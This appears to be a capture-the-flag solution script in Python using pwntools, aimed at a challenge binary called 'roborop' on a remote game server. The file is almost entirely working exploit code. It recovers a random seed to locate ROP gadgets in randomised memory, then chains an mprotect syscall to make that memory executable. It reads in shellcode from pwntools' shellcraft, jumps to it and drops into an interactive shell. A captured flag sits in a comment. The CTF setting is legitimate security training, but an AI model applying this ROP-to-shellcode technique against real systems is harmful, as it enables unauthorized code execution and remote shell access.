#!/usr/bin/env python3

from pwn import *
from time import sleep
import ctypes

exe = ELF("./roborop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc roborop-1.play.hfsc.tf 1993"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    libm = ctypes.CDLL('/lib/x86_64-linux-gnu/libm.so.6')
    r = conn()

    r.recvuntil(b"seed: ")
    seed = int(r.recvline()[:-1], 16)

    r.recvuntil(b"addr: ")
    base = int(r.recvline()[:-1], 16)
    libm.srand(seed)

    search = []

    search.append(asm("""pop rax
                         ret"""))
    
    search.append(asm("""pop rdi
                         ret"""))
    
    search.append(asm("""pop rsi
                         ret"""))
    
    search.append(asm("""pop rdx
                         ret"""))
    
    search.append(asm("""syscall
                         ret"""))
        
    search.append(asm("""jmp rsi
                         ret"""))

    addr = [-1, -1, -1, -1, -1, -1, -1]
    cont=0
   
    rop=b""

    for k in range(0x4000000):
        if cont==6:
            print("DONEEE")
            break

        tmp=(libm.rand().to_bytes(4, 'little'))
        
        for num, i in enumerate(search):
            if addr[num]!=-1:
                continue
            idx = tmp.find(i)
            if idx==-1:
                continue
            addr[num]=(idx+k*4)
            
            cont+=1

        if k%0x1000==0:
            print(f"{cont}/6")
          
    
    POP_RAX = p64(base +  addr[0]          )
    POP_RDI = p64(base +  addr[1]          )
    POP_RSI = p64(base +  addr[2]          )   
    POP_RDX = p64(base +  addr[3]          )     
    SYSCALL = p64(base +  addr[4]          )      
    JMP_RSI = p64(base +  addr[5]          ) 


    payload = POP_RAX + p64(10) + POP_RDI + p64(base) + POP_RSI + p64(4000) + POP_RDX + p64(7) + SYSCALL

    payload += POP_RSI + p64(base) + POP_RDI + p64(0) + POP_RDX + p64(300) + POP_RAX + p64(0) + SYSCALL + JMP_RSI

    #gdb.attach(r)
    r.sendline(payload)
    sleep(0.1)

    r.sendline(asm(shellcraft.sh()))

    r.interactive()
    #midnight{spR4Y_aNd_pR4Y}

if __name__ == "__main__":
    main()